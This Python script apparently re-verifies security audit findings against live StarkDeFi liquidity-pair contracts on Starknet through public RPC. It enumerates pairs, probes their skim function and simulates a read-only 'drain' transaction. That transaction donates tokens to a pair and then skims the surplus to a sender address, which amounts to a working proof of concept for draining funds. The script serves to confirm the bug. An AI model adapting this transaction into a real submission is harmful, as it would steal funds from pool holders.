#!/usr/bin/env python3
"""CI re-verification of the StarkDeFi C2-48 findings (read-only, keyless RPC).

Writes results to ci-out/. No keys, no transactions, no writes to any chain.
"""
import json, urllib.request, subprocess, os, sys, time

ENDPOINTS = [
    "https://starknet-rpc.publicnode.com",
    "https://api.cartridge.gg/x/starknet/mainnet",
    "https://starknet.api.onfinality.io/public",
]
FACTORY = "0x02721f5ab785ae5E13b276ca9d41e859B7b150440A288A7826Ba5E27Dd05E08e"
BUG = "0xaef408ec73c83edbc42d00af164ae8073404aa665b9895041c705c871809f9"
SPIST = "0x6182278e63816ff4080ed07d668f991df6773fd13db0ea10971096033411b11"
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ci-out")
os.makedirs(OUT, exist_ok=True)

def rpc(method, params, timeout=60, retries=6):
    last = None
    for i in range(retries):
        url = ENDPOINTS[i % len(ENDPOINTS)]
        try:
            req = urllib.request.Request(url, data=json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode(),
                                         headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                out = json.loads(r.read().decode())
            if "result" in out: return out["result"]
            last = out
        except Exception as e:
            last = repr(e)
        time.sleep(0.5)
    raise RuntimeError(f"{method}: {last}")

def sel(f):
    h = subprocess.run(["cast","keccak",f], capture_output=True, text=True).stdout.strip()
    return hex(int(h,16) & ((1<<250)-1))

def call(addr, s, cd, block="latest"):
    return rpc("starknet_call", [{"contract_address":addr,"entry_point_selector":s,"calldata":cd}, block])

def main():
    res = {}
    block = rpc("starknet_blockNumber", [])
    res["block"] = block
    # 1. factory enumeration
    pairs_res = call(FACTORY, sel("all_pairs"), [], {"block_number": block})
    count = int(pairs_res[0],16); arr = int(pairs_res[1],16)
    pairs = pairs_res[2:2+arr]
    res["factory_pairs"] = count
    res["factory_all_pairs_len"] = arr
    # 2. factory state
    st = {}
    for name in ["fee_handler","fee_to","get_fees","protocol_fee_on"]:
        try: st[name] = call(FACTORY, sel(name), [], {"block_number": block})
        except Exception as e: st[name] = f"ERR {e}"
    try:
        call(FACTORY, sel("assert_not_paused"), [], {"block_number": block}); st["paused"] = False
    except Exception: st["paused"] = True
    st["class_hash_for_pair_contract"] = call(FACTORY, sel("class_hash_for_pair_contract"), [], {"block_number": block})
    res["factory_state"] = st
    # 3. skim probe on 6 pairs per class (pick by class hash)
    from concurrent.futures import ThreadPoolExecutor, as_completed
    def getch(p):
        try: return p, rpc("starknet_getClassHashAt", [{"block_number": block}, p])
        except Exception: return p, "ERR"
    class_of = {}
    with ThreadPoolExecutor(max_workers=8) as ex:
        for f in as_completed([ex.submit(getch, p) for p in pairs]):
            p, ch = f.result(); class_of[p] = ch
    by_class = {}
    sample = []
    for p in pairs:
        ch = class_of[p]
        by_class.setdefault(ch, []).append(p)
        if len(by_class[ch]) <= 6:
            sample.append((p, ch))
    probe = []
    for p, ch in sample:
        try:
            out = rpc("starknet_call", [{"contract_address":p,"entry_point_selector":sel("skim"),"calldata":["0x1234567890abcdef1234567890abcdef12345678"]}, {"block_number": block}])
            status = "OK"; reason = ""
        except Exception as e:
            status = "REVERT"; reason = str(e)[:120]
        probe.append({"pair": p, "class": ch, "status": status, "reason": reason})
    res["skim_probe"] = probe
    res["class_counts"] = {k: len(v) for k, v in by_class.items()}
    # 4. end-to-end drain simulation (SKIP_VALIDATE + SKIP_FEE_CHARGE; state discarded)
    sim = {"note": "read-only simulation; no signature; state discarded"}
    sender = "0x283b6df5330e5ba0c9ffc4a5c80de4227bdab78b6a155654ae78f220d6bdf53"  # protocol fee_handler (holds STRK)
    P2 = "0x46632b5586cf8e3af119060e0eb2bb70a2929819ce439492c15f6b4ddbdfe39"
    snap = call(P2, sel("snapshot"), [], {"block_number": block})
    r0 = int(snap[6],16) + (int(snap[7],16)<<128)
    r1 = int(snap[8],16) + (int(snap[9],16)<<128)
    b1 = int(call(snap[1], sel("balanceOf"), [P2], {"block_number": block})[0],16) + (int(call(snap[1], sel("balanceOf"), [P2], {"block_number": block})[1],16)<<128)
    b0 = int(call(snap[0], sel("balanceOf"), [P2], {"block_number": block})[0],16) + (int(call(snap[0], sel("balanceOf"), [P2], {"block_number": block})[1],16)<<128)
    d = r1 + b1 - b0
    sim["pair"] = P2; sim["r0"] = str(r0); sim["r1"] = str(r1); sim["b0"] = str(b0); sim["b1"] = str(b1); sim["donation"] = str(d)
    def call_arr(calls):
        cd = [hex(len(calls))]
        for to, s, args in calls:
            cd += [to, s, hex(len(args))] + args
        return cd
    tx = {"type":"INVOKE","version":"0x3","sender_address":sender,
          "calldata":call_arr([(snap[0], sel("transfer"), [P2, hex(d), "0x0"]), (P2, sel("skim"), [sender])]),
          "signature":[],"nonce":"0x123",
          "resource_bounds":{"l1_gas":{"max_amount":"0x2000000","max_price_per_unit":"0x40000000000"},
                             "l1_data_gas":{"max_amount":"0x2000000","max_price_per_unit":"0x40000000000"},
                             "l2_gas":{"max_amount":"0x200000000","max_price_per_unit":"0x40000000000"}},
          "tip":"0x0","paymaster_data":[],"account_deployment_data":[],
          "nonce_data_availability_mode":"L1","fee_data_availability_mode":"L1"}
    ok = False
    for url in ENDPOINTS:
        try:
            req = urllib.request.Request(url, data=json.dumps({"jsonrpc":"2.0","id":1,"method":"starknet_simulateTransactions","params":["latest",[tx],["SKIP_VALIDATE","SKIP_FEE_CHARGE"]]}).encode(),
                                         headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=120) as r:
                out = json.loads(r.read().decode())
            if "result" in out:
                with open(os.path.join(OUT, "simulate_drain_raw.json"), "w") as fh:
                    json.dump(out, fh, indent=1)
                # extract transfers from trace
                tr = out["result"][0]["transaction_trace"]["execute_invocation"]
                transfers = []
                def walk(c):
                    cd = c.get("calldata") or []
                    if c.get("entry_point_selector") == sel("transfer") and len(cd) >= 3:
                        transfers.append({"token": c.get("contract_address"), "to": cd[0], "amount_low": cd[1], "amount_high": cd[2]})
                    for sub in (c.get("calls") or []): walk(sub)
                walk(tr)
                sim["transfers_in_trace"] = transfers
                sim["drain_transfer_amount"] = next((t for t in transfers if t["token"].lower()==snap[1].lower()), None)
                sim["expected_b1"] = str(b1)
                sim["status"] = "SIMULATED_OK"
                ok = True
                break
        except Exception as e:
            sim["last_error"] = repr(e)[:200]
    if not ok: sim["status"] = "SIMULATION_FAILED"
    res["drain_simulation"] = sim
    with open(os.path.join(OUT, "ci_verify.json"), "w") as fh:
        json.dump(res, fh, indent=1)
    from collections import Counter
    sc = Counter(f"{p['class'][:10]}:{p['status']}" for p in probe)
    print(json.dumps({"block": block, "pairs": count, "class_counts": res["class_counts"],
                      "skim_statuses": dict(sc),
                      "drain": sim.get("drain_transfer_amount")}, indent=1))
    print("wrote ci-out/ci_verify.json")

if __name__ == "__main__":
    main()
